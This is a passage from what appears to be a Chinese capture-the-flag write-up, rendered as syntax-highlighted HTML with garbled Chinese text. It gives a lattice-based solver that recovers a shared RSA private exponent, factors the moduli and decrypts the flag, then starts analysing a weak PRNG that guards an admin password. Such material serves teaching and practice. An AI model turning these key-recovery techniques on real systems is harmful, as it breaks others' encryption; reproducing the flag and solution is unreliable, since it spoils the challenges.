</span></span><span class=line><span class=cl><span class=n>e3</span> <span class=o>=</span> <span class=mi>528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span>
</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=mi>120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span>
</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=mi>63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span>
</span></span><span class=line><span class=cl><span class=n>e0</span> <span class=o>=</span> <span class=mi>271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span>
</span></span><span class=line><span class=cl><span class=n>n4</span> <span class=o>=</span> <span class=mi>1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span>
</span></span><span class=line><span class=cl><span class=n>n3</span> <span class=o>=</span> <span class=mi>1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span>
</span></span><span class=line><span class=cl><span class=n>n2</span> <span class=o>=</span> <span class=mi>966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span>
</span></span><span class=line><span class=cl><span class=n>n1</span> <span class=o>=</span> <span class=mi>801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span>
</span></span><span class=line><span class=cl><span class=n>n0</span> <span class=o>=</span> <span class=mi>729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>n4</span> <span class=o>**</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>M</span> <span class=o>=</span> <span class=n>gmpy2</span><span class=o>.</span><span class=n>iroot</span><span class=p>(</span><span class=n>t</span><span class=p>,</span> <span class=mi>3</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>M</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>L</span> <span class=o>=</span> <span class=n>Matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=p>[[</span><span class=n>M</span><span class=p>,</span> <span class=n>e0</span><span class=p>,</span> <span class=n>e1</span><span class=p>,</span> <span class=n>e2</span><span class=p>,</span> <span class=n>e3</span><span class=p>,</span> <span class=n>e4</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n1</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n2</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span>
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n3</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>                <span class=p>[</span><span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>-</span><span class=n>n4</span><span class=p>]])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=p>(</span><span class=n>L</span><span class=o>.</span><span class=n>LLL</span><span class=p>()[</span><span class=mi>2</span><span class=p>][</span><span class=mi>0</span><span class=p>])</span><span class=o>//</span> <span class=n>M</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#79707249059210800427586261608616662408613108106616463837006013556788454508274558925787023296092333364088239266520329780878389357</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>d</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>GCD</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Hash</span> <span class=kn>import</span> <span class=n>SHA3_512</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>AES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.Padding</span> <span class=kn>import</span> <span class=n>unpad</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_one_factor</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>d</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>e</span> <span class=o>*</span> <span class=n>d</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>m</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>t</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>t</span> <span class=o>//=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>random</span><span class=o>.</span><span class=n>randint</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>n</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>v</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>t</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>v</span> <span class=o>==</span> <span class=mi>1</span> <span class=ow>or</span> <span class=n>v</span> <span class=o>==</span> <span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=n>v_prev</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>v</span> <span class=o>!=</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>v_prev</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>            <span class=n>v</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>v</span> <span class=o>==</span> <span class=n>n</span> <span class=o>-</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>  
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>v</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=n>factor</span> <span class=o>=</span> <span class=n>GCD</span><span class=p>(</span><span class=n>v_prev</span> <span class=o>-</span> <span class=mi>1</span><span class=p>,</span> <span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>factor</span> <span class=o>!=</span> <span class=mi>1</span> <span class=ow>and</span> <span class=n>factor</span> <span class=o>!=</span> <span class=n>n</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>factor</span> 
</span></span><span class=line><span class=cl>                <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>find_all_factors</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>d</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>factors_found</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>solve</span><span class=p>(</span><span class=n>num</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>num</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span> <span class=o>=</span> <span class=n>get_one_factor</span><span class=p>(</span><span class=n>num</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>d</span><span class=p>)</span>     
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>f</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>factors_found</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span>
</span></span><span class=line><span class=cl>        <span class=n>solve</span><span class=p>(</span><span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>solve</span><span class=p>(</span><span class=n>num</span> <span class=o>//</span> <span class=n>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>factors_found</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ns</span> <span class=o>=</span> <span class=p>[</span><span class=mi>729626364576206469704240917876675932841677846807662743683194531189219993605123671836962855605283722577718230552963049472251011326675202612492908848548419883361685662678347011887752523869081347313358470192291106167923273619672010347904232948623232956703976722596246251219832472749781700661621717970912452690860710243752051416797956410009096107757901714990018414837758557784033898837218196380413347278999394220278929595840196278059116531409774355756772349502091527</span><span class=p>,</span> <span class=mi>1905432596115201099512716986634374621489368222604315919606798930577721863294916275385323430940054377575273762764157350871093106918016952598143825002497857813393515175754983371150373414986745909170502391681896252141058196242286758315439213464335711981585004206505072743627148478873299089587473670712150938286701206231734068594554186483978059254161949801153805752489828395472590106405761648181381945795038085612905557546907903561767813822101495476457137965288880829</span><span class=p>,</span> <span class=mi>1364349980724204783960363890369037262456777329397270902364257972605993939460160766530889520645888701966401869980072151818996346007664249855901114579605632358191242379651843548926065735575249122023543206153088606751338328933651430885645444839242513718915066302971957689904414300766000572990594260836480347717506097403302570129593533017205416936506156113683938133811098995666977893386015199252455279325252257306124895958614122639652100229863446635612470942945471629</span><span class=p>,</span> <span class=mi>801368910415539931617837996119032301790585643652894417707002521182569449104238101253556548156062846942011258499343192564944616333555000780965111384091131074358231330717413121484815002612991437436336271715078003900216545055505405363415778086330672269759661284535787363323398929120499505051378299467980018690275341014026390376705451595348674549031968858607633947674244014656615045639930798213161815130251215148286379903187335369475976106390101774566278602818405563</span><span class=p>,</span> <span class=mi>966507016385573035667733231340091844033410158675175976938028218854439065352997895173668326599042719776214706325758565722305289931861889759808022284179479582700755314576250841330755684569639628012527976286442288571350327307582007959428925460653350857512795573323486273071975979456828134582982048746188934676698845075430701350305713747666370252912970653968385390246217234899448990236850880873105998296512557366752267827688836849041157572772272378435636367162425013</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>es</span> <span class=o>=</span> <span class=p>[</span><span class=mi>271264973728317298627822473902975461834475616151421882685140849409171660245987005602120200976835072966082573357282000859946014645129524701781302678299643424924092704444611429422064341444927220441684375194952864825982915148126084102832224731498348832396834993134927447743362540828447462072582023959357845229307404791804881057335208287771899121154533179273274029972648764343120454360366227609296867085751393693129946684282269737380796082741762647814800935844443493</span><span class=p>,</span> <span class=mi>1003585299728442138241618739786172474341836074346983356412903232651178484164007865852681323340512406956827176253325249434459143223478630158795320316445722303141000749369087588146876087005139101967705654538148200848735795226715484701026716263131990473014248826031226350016169675911701420383849573743077161936130739955632072650333006768068396767746102320645544271946493533626477749495460960365939362830334782483616521427745117179433129272929291131199903349977861093</span><span class=p>,</span> <span class=mi>528794486797786998573050589647661205854628331390578568482905276781799068613879068393786314280307765489986817827366340249545226369795434498075653554440390174127680889163962386407937584138342055553885382937486807537913781141805602397908008361192107987266566035872632130183102501118938531330140154852996630732644530954025739132771439783366022539476194754352734861357158197716623228211860189868592877935421689151152269864018399507621324672725433395533000425391708101</span><span class=p>,</span> <span class=mi>63082374875671578481986217433413118060930080658278695174993640397998104913203950822096713822227514918774669078130439943184022889683633824002111416144422250644695809731240622289790840695469043596475009958463780096705571401137513331089894183226911665633164170027318352120002851940432163291498705806239158684141492080194438572549164494596965748695244152843943149994989589419519395650481254722496058552304954140980743159877918387972030837603120258130045817858729621</span><span class=p>,</span> <span class=mi>120373323462979513980656435521004077312964483601298713849302793507801996545855844801219890178210569842943901523332883574699699439655256681068585396438543716728771762620808023696864023456625376138578749985774885652016790204471223404504866831356254849552890279653807176865165230965065842479979722094076544915080001416276324550993965426099480075249719779502220020343237480355441663501565965298776708377675024327374331823503627493136287447543537154779812201209689733</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ct</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;J</span><span class=se>\x08\x0c\xfe\x0e</span><span class=s1>C</span><span class=se>\n\x96</span><span class=s1>!</span><span class=se>\xb3\x05\xa9\x9b\xf9\n\xe3</span><span class=s1>-</span><span class=se>\xf2</span><span class=s1>m</span><span class=se>\xdb</span><span class=s1>&amp;.</span><span class=se>\xb5</span><span class=s1>h</span><span class=se>\xe1\x0e\xd6\x89\x14\x87</span><span class=s1>Z</span><span class=se>\x0b</span><span class=s1>0p</span><span class=se>\xbb\xd9\x93\xd7\x1c</span><span class=s1>T</span><span class=se>\xa2\xf3</span><span class=s1>6</span><span class=se>\x02\x8e</span><span class=s1>:</span><span class=se>\\\x92</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>total_sum_of_primes</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>all_ps_tuples</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>ns</span> <span class=ow>or</span> <span class=n>ns</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=o>...</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;é”™è¯¯ï¼šè¯·åœ¨è„šæœ¬ä¸­å¡«å…¥ ns, es, ct å’Œ d çš„å®é™…å€¼ã€‚&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># éå†æ¯ä¸€å¯¹ (n, e)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>ns</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=n>n</span> <span class=o>=</span> <span class=n>ns</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>e</span> <span class=o>=</span> <span class=n>es</span><span class=p>[</span><span class=n>i</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ­£åœ¨åˆ†è§£ n</span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>n</span><span class=si>}</span><span class=s2> ...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>factors</span> <span class=o>=</span> <span class=n>find_all_factors</span><span class=p>(</span><span class=n>n</span><span class=p>,</span> <span class=n>e</span><span class=p>,</span> <span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># ä½ çš„ä»£ç æ˜¾ç¤º n = p*q*r</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nb>set</span><span class=p>(</span><span class=n>factors</span><span class=p>))</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span> <span class=c1># ä½¿ç”¨ set æ¥å¤„ç†åˆ†è§£å‡ºç›¸åŒå› å­çš„æƒ…å†µ</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>,</span> <span class=n>r</span> <span class=o>=</span> <span class=n>factors</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ‰¾åˆ°å› å­: </span><span class=si>{</span><span class=n>p</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>q</span><span class=si>}</span><span class=s2>, </span><span class=si>{</span><span class=n>r</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>all_ps_tuples</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>p</span><span class=p>,</span> <span class=n>q</span><span class=p>,</span> <span class=n>r</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>total_sum_of_primes</span> <span class=o>+=</span> <span class=p>(</span><span class=n>p</span> <span class=o>+</span> <span class=n>q</span> <span class=o>+</span> <span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;æ‰€æœ‰ç´ å› å­çš„æ€»å’Œ: </span><span class=si>{</span><span class=n>total_sum_of_primes</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=n>SHA3_512</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>total_sum_of_primes</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>digest</span><span class=p>()[:</span><span class=mi>16</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;è®¡ç®—å¾—åˆ°çš„ AES å¯†é’¥ (hex): </span><span class=si>{</span><span class=n>key</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>AES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>AES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>flag_padded</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>ct</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>flag</span> <span class=o>=</span> <span class=n>unpad</span><span class=p>(</span><span class=n>flag_padded</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>===================================&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;è§£å¯†æˆåŠŸ! Flag: </span><span class=si>{</span><span class=n>flag</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;===================================&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1>#flag{9b31dd3e-aa6a-4c4d-b796-bff4e4dfe0cc}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=fms>FMS</h2><p>ç²—ç•¥é˜…è¯»ä»£ç å¯ä»¥çŸ¥é“<code>admin</code>ç”¨æˆ·çš„å¯†ç æ˜¯ç”±<code>PRNG</code>ç±»å¯¹è±¡<code>prng</code>çš„<code>choices</code>æ–¹æ³•ç”Ÿæˆçš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬è¦è·å¾—å¯†ç çš„è¯åªèƒ½å…ˆçŸ¥é“<code>prng</code>çš„ç§å­æ˜¯ä»€ä¹ˆï¼Œè§‚å¯Ÿä»£ç ä¸­çš„<code>PRNG</code>ç±»:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>PRNG</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>a</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>b</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>p</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>seed</span><span class=o>=</span><span class=kc>None</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>p</span> <span class=o>=</span> <span class=n>p</span> <span class=k>if</span> <span class=n>p</span> <span class=k>else</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>128</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>=</span> <span class=n>a</span> <span class=k>if</span> <span class=n>a</span> <span class=k>else</span> <span class=n>randrange</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>b</span> <span class=o>=</span> <span class=n>b</span> <span class=k>if</span> <span class=n>b</span> <span class=k>else</span> <span class=n>randrange</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>=</span> <span class=n>seed</span> <span class=k>if</span> <span class=n>seed</span> <span class=k>else</span> <span class=n>randrange</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>next</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>a</span> <span class=o>*</span> <span class=bp>self</span><span class=o>.</span><span class=n>state</span> <span class=o>+</span> <span class=bp>self</span><span class=o>.</span><span class=n>b</span><span class=p>)</span> <span class=o>%</span> <span class=bp>self</span><span class=o>.</span><span class=n>p</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>state</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>randbytes</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>out</span> <span class=o>+=</span> <span class=nb>bytes</span><span class=p>([</span><span class=bp>self</span><span class=o>.</span><span class=n>next</span><span class=p>()</span> <span class=o>%</span> <span class=mi>256</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>out</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>choices</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>seq</span><span class=p>,</span> <span class=n>k</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>[</span><span class=n>seq</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>next</span><span class=p>()</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>seq</span><span class=p>)]</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>k</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>getPrime</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
